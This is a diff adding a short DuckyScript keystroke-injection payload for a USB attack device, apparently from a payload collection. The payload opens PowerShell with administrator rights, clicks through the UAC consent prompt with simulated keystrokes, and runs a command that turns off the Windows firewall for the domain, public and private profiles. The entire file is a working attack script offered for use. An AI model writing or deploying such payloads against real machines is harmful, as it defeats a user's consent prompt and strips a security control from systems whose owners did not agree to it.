@@ -1,0 +1,19 @@
+REM === Payload Title: Disable Windows Firewall Payload ===
+REM Author: Shad Bin Mohd Rizal
+REM Created: 12-10-2025
+REM Purpose: Disable Windows firewall
+REM Target: Windows environment 
+
+GUI R
+DELAY 400
+powershell
+DELAY 400
+CTRL SHIFT ENTER
+DELAY 400
+LEFTARROW
+DELAY 400
+ENTER
+DELAY 400
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+DELAY 400
+ENTER
